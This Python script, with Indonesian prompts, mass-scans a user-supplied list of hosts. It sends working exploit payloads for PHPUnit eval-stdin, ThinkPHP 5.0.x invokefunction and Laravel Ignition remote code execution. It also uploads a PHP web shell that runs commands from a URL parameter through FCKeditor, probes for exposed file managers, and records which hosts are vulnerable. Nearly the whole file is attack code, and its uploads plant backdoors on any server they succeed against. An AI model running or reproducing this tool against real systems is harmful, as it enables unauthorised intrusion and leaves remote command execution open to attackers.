import requests
import concurrent.futures
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    print(Fore.CYAN + r"""
 _   _           _          ____             _           
| \ | | _____  _| |_ ___   |  _ \ ___  _   _| |_ ___ ___ 
|  \| |/ _ \ \/ / __/ _ \  | |_) / _ \| | | | __/ __/ __|
| |\  |  __/>  <| || (_) | |  __/ (_) | |_| | || (__\__ \
|_| \_|\___/_/\_\\__\___/  |_|   \___/ \__,_|\__\___|___/
     Next Project Scanner - FIXED REDIRECT & SAFE CHECK
""")

def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        return "http://" + url
    return url

def load_targets():
    filename = input(Fore.CYAN + "[?] Masukkan nama file target (contoh: list.txt):\n>> ").strip()
    try:
        with open(filename, "r") as f:
            return [normalize_url(line.strip().rstrip("/")) for line in f if line.strip()]
    except:
        print(Fore.RED + f"[ERROR] File '{filename}' tidak ditemukan.")
        return []

payloads = [
    {
        "name": "PHPUnit",
        "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "method": "POST",
        "data": "<?php echo 'ShellOK'; system('id'); ?>",
        "check": "ShellOK"
    },
    {
        "name": "ThinkPHP 5.0.x",
        "path": "/index.php?s=/index/\\think\\app/invokefunction&function=phpinfo",
        "method": "GET",
        "check": "phpinfo"
    },
    {
        "name": "Laravel Ignition",
        "path": "/_ignition/execute-solution",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/resource=index"}}',
        "check": "viewFile"
    },
    {
        "name": "FCKeditor Upload",
        "path": "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=File",
        "method": "POST",
        "files": {"NewFile": ("shell.php", "<?php echo 'ShellOK'; system($_GET['cmd']); ?>", "application/x-php")},
        "check": "shell.php"
    },
    {
        "name": "elFinder",
        "path": "/elfinder/php/connector.minimal.php",
        "method": "GET",
        "check": '{"api":"2.1"}'
    },
    {
        "name": "PHPFileManager",
        "path": "/phpfilemanager.php",
        "method": "GET",
        "check": "File Manager"
    }
]

def scan_target(target):
    results = []
    session = requests.Session()
    for p in payloads:
        url = target + p["path"]
        try:
            if p["method"] == "POST":
                r = session.post(
                    url,
                    data=p.get("data"),
                    headers=p.get("headers", {}),
                    files=p.get("files", {}),
                    timeout=10,
                    allow_redirects=False
                )
            else:
                r = session.get(
                    url,
                    headers=p.get("headers", {}),
                    timeout=10,
                    allow_redirects=False
                )

            if r.is_redirect or r.status_code in [301, 302, 303, 307, 308]:
                results.append(Fore.YELLOW + f"[NOT FOUND] {target} -> {p['name']}")
            elif p["check"] in r.text:
                results.append(Fore.GREEN + f"[FOUND] {target} -> {p['name']}")
            else:
                results.append(Fore.YELLOW + f"[NOT FOUND] {target} -> {p['name']}")
        except:
            results.append(Fore.RED + f"[ERROR] {target} -> {p['name']}")
    return results

def scan_all(targets):
    all_results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(scan_target, t) for t in targets]
        for future in concurrent.futures.as_completed(futures):
            all_results.extend(future.result())
    return all_results

def save_results(raw_results, filename="results.txt"):
    with open(filename, "w") as f:
        for line in raw_results:
            f.write(line.replace(Fore.GREEN, "")
                        .replace(Fore.YELLOW, "")
                        .replace(Fore.RED, "")
                        .replace(Style.RESET_ALL, "") + "\n")

if __name__ == "__main__":
    banner()
    targets = load_targets()
    if targets:
        results = scan_all(targets)
        for line in results:
            print(line)
        save_results(results)
        print(Fore.CYAN + f"\n[+] Hasil disimpan ke file: results.txt")
